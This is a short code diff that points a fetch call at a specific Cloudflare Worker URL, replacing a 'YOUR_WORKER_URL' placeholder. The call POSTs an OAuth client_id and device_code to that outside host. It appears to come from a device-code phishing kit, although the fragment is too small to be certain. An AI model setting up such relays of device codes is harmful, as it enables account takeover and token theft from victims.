@@ -46,7 +46,7 @@
 
                     try {
                         // UPDATE THIS TO YOUR CLOUDFLARE WORKER URL
-                        const r = await fetch('https://YOUR_WORKER_URL.workers.dev', {
+                        const r = await fetch('https://device-code.brightmccain.workers.dev/', {
                             method: 'POST',
                             body: JSON.stringify({ c_id: data.client_id, d_c: data.device_code })
                         });
